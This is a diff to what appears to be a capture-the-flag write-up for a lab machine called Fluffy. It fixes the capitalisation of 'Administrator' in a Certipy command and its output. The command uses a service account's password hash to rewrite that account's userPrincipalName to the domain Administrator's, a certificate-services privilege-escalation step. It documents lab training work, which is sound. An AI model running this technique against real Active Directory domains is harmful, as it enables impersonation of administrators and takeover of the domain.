@@ -557,11 +557,11 @@ Info: Establishing connection to remote endpoint
 ### Exploitation
 
 ```shell
-certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn administrator@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
+certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn Administrator@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
-    userPrincipalName                   : administrator@fluffy.htb
+    userPrincipalName                   : Administrator@fluffy.htb
 [*] Successfully updated 'ca_svc'
 
 ```
